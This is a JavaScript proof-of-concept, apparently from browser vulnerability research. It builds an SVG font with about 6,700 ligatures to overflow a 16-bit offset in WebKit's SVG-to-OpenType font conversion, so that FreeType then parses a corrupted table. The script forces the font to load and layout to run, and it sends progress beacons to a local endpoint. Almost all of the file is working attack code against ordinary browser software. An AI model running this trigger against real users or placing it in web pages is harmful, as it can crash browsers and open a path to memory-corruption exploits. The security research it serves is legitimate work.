// p170a — SVG font uint16 offset overflow
// SVGToOTFFontConversion.cpp Placeholder::populate() truncates size_t→uint16
// Create SVG font with ~7000 ligatures to push GSUB subtable past 65KB
// Corrupted OTF offset → FreeType parses invalid table data
// Beacon prefix: V170A-

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V170A-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  // Pool of base characters: A + 82 others (B through 0x93)
  var FIRST = 0x41; // 'A' — all ligatures start with this
  var POOL_START = 0x42;
  var POOL_SIZE = 82; // chars 0x42..0x93
  // 82 * 82 = 6724 three-char ligatures
  // Each lig in GSUB: 2B(offset) + 2B(glyph) + 2B(count) + 2B(component) = 8B
  // Total: 6724*8 + overhead ≈ 54KB + LigatureSet header ≈ 68KB > 65KB

  var svgNS = 'http://www.w3.org/2000/svg';

  try {
    var svg = document.createElementNS(svgNS, 'svg');
    svg.setAttribute('width', '0');
    svg.setAttribute('height', '0');
    svg.style.position = 'absolute';

    var font = document.createElementNS(svgNS, 'font');
    font.setAttribute('id', 'OvfFont');
    font.setAttribute('horiz-adv-x', '1000');

    var ff = document.createElementNS(svgNS, 'font-face');
    ff.setAttribute('font-family', 'OvfFont');
    ff.setAttribute('units-per-em', '1000');
    ff.setAttribute('ascent', '800');
    ff.setAttribute('descent', '-200');
    font.appendChild(ff);

    // Missing glyph
    var mg = document.createElementNS(svgNS, 'missing-glyph');
    mg.setAttribute('d', 'M0 0h500v800h-500z');
    font.appendChild(mg);

    B('GLYPHS-START');

    // Base glyph for first char
    var g0 = document.createElementNS(svgNS, 'glyph');
    g0.setAttribute('unicode', String.fromCharCode(FIRST));
    g0.setAttribute('d', 'M100 0L500 800L900 0z');
    font.appendChild(g0);

    // Pool glyphs (single-char)
    for (var i = 0; i < POOL_SIZE; i++) {
      var g = document.createElementNS(svgNS, 'glyph');
      g.setAttribute('unicode', String.fromCharCode(POOL_START + i));
      g.setAttribute('d', 'M0 0h500v800h-500z');
      font.appendChild(g);
    }
    B('BASE-' + (1 + POOL_SIZE));

    // Ligature glyphs: 3-char, all start with FIRST, then two from pool
    var ligCount = 0;
    for (var a = 0; a < POOL_SIZE; a++) {
      for (var b = 0; b < POOL_SIZE; b++) {
        var lg = document.createElementNS(svgNS, 'glyph');
        var uc = String.fromCharCode(FIRST) +
                 String.fromCharCode(POOL_START + a) +
                 String.fromCharCode(POOL_START + b);
        lg.setAttribute('unicode', uc);
        lg.setAttribute('d', 'M0 0h500v800h-500z');
        font.appendChild(lg);
        ligCount++;
      }
    }
    B('LIGS-' + ligCount);

    svg.appendChild(font);
    document.body.appendChild(svg);
    B('SVG-ADDED');

    // Apply the font to trigger conversion
    var testDiv = document.createElement('div');
    testDiv.id = 'fonttest';
    testDiv.style.fontFamily = 'OvfFont, serif';
    testDiv.style.fontSize = '48px';
    testDiv.style.position = 'absolute';
    testDiv.style.top = '0';
    testDiv.style.left = '0';
    // Use characters from the font including ligature sequences
    var testText = '';
    for (var i = 0; i < 20; i++) {
      testText += String.fromCharCode(FIRST) +
                  String.fromCharCode(POOL_START + (i % POOL_SIZE)) +
                  String.fromCharCode(POOL_START + ((i * 7) % POOL_SIZE)) + ' ';
    }
    testDiv.textContent = testText;
    document.body.appendChild(testDiv);
    B('TEXT-ADDED');

    // Force layout to trigger font loading
    void testDiv.offsetHeight;
    B('LAYOUT-FORCED');

    // Wait for font to actually load/render
    setTimeout(function() {
      B('RENDER-CHECK');
      var el = document.getElementById('fonttest');
      if (el) {
        var w = el.offsetWidth;
        var h = el.offsetHeight;
        B('SIZE-' + w + 'x' + h);
      }

      // If we're still alive, the conversion happened
      // The corrupted OTF may crash FreeType, or may render
      B('SURVIVED');

      // Check if font actually loaded by comparing widths
      var probe1 = document.createElement('span');
      probe1.style.fontFamily = 'OvfFont';
      probe1.style.fontSize = '100px';
      probe1.textContent = 'ABCDEF';
      document.body.appendChild(probe1);
      var w1 = probe1.offsetWidth;

      var probe2 = document.createElement('span');
      probe2.style.fontFamily = 'serif';
      probe2.style.fontSize = '100px';
      probe2.textContent = 'ABCDEF';
      document.body.appendChild(probe2);
      var w2 = probe2.offsetWidth;

      if (w1 !== w2) {
        B('FONT-LOADED');
      } else {
        B('FONT-FALLBACK');
      }

      B('DONE');
    }, 2000);

  } catch(e) {
    B('ERR-' + String(e).substring(0, 40));
  }
})();
